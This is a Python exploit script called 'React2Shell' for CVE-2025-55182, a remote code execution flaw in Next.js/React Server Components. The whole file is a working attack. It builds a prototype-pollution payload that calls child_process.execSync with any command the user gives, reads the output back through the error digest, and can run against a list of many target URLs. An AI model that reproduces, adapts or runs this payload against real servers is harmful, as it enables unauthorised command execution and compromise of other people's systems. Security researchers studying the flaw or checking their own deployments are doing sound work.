import requests
import sys
import json
import re
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[97m"
BOLD = "\033[1m"

CVE = rf"""
{RED}{BOLD}
█████▄  ▄▄▄▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄▄ ████▄ ▄▄▄▄▄  ██  ██ ▄▄▄▄▄ ▄▄    ▄▄    
██▄▄██▄ ██▄▄  ██▀██ ██▀▀▀   ██    ▄██▀ ██▄▄   ██████ ██▄▄  ██    ██    
██   ██ ██▄▄▄ ██▀██ ▀████   ██   ███▄▄ ▄▄▄███ ██  ██ ██▄▄▄ ██▄▄▄ ██▄▄▄ 
                                                                
{MAGENTA} Next.js/React Server RCE Exploit — CVE-2025-55182
 Author: Ankit Pandey GitHub: https://github.com/ankitspandey07
    🚀  React2Shell — Security Testing Utility  🚀
{RESET}
"""

def print_banner():
    print(CVE)
    print(f"{CYAN}{'═'*72}{RESET}")

def check_vulnerability(base_url, executable, proxies=None):
    if not base_url.startswith("http"):
        base_url = "http://" + base_url

    print(f"\n{WHITE}{BOLD}[→] Target: {CYAN}{base_url}{RESET}")
    print(f"{WHITE}{BOLD}[→] Exec:   {YELLOW}{executable}{RESET}")

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    headers = {"Next-Action": "x", "User-Agent": "Mozilla/5.0"}

    try:
        res = requests.post(base_url, files=files, headers=headers, timeout=10,
                            verify=False, proxies=proxies)

        match = re.search(r'"digest":"(.*?)"', res.text, re.DOTALL)

        if match:
            output = match.group(1).replace("\\n", "\n").replace("\\r", "")
            print(f"{GREEN}{BOLD}[✓] VULNERABLE — RCE Successful!{RESET}")
            print(f"{YELLOW}{'-'*60}{RESET}")
            print(f"{WHITE}{output}{RESET}")
            print(f"{YELLOW}{'-'*60}{RESET}")
            return True

        elif res.status_code == 500 and "digest" in res.text:
            print(f"{YELLOW}[!] Possible vulnerability (digest leak detected){RESET}")
        else:
            print(f"{RED}[✗] Not vulnerable — Status: {res.status_code}{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {str(e)}{RESET}")

    return False

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="Next.js RCE Exploit")

    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-l", "--list", help="File with multiple URLs")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")

    parser.add_argument("--proxy", help="HTTP proxy (http://127.0.0.1:8080)")
    parser.add_argument("--proxy-https", help="HTTPS proxy")

    args = parser.parse_args()

    proxies = {}
    if args.proxy:
        proxies["http"] = args.proxy
    if args.proxy_https:
        proxies["https"] = args.proxy_https

    if not args.url and not args.list:
        print(f"{RED}[!] Provide -u <url> or -l <listfile>{RESET}")
        sys.exit(1)

    if args.url:
        check_vulnerability(args.url.strip(), args.command, proxies)
        return

    if args.list:
        try:
            with open(args.list, "r") as f:
                urls = [u.strip() for u in f if u.strip()]
        except FileNotFoundError:
            print(f"{RED}[!] File not found: {args.list}{RESET}")
            sys.exit(1)

        print(f"{BLUE}{BOLD}[+] Loaded {len(urls)} targets{RESET}")
        print(f"{CYAN}{'═'*72}{RESET}")

        hit = 0
        for url in urls:
            if check_vulnerability(url, args.command, proxies):
                hit += 1
            print(f"{CYAN}{'─'*72}{RESET}")

        print(f"{GREEN}{BOLD}[✓] Scan complete — Vulnerable: {hit}{RESET}")

if __name__ == "__main__":
    main()
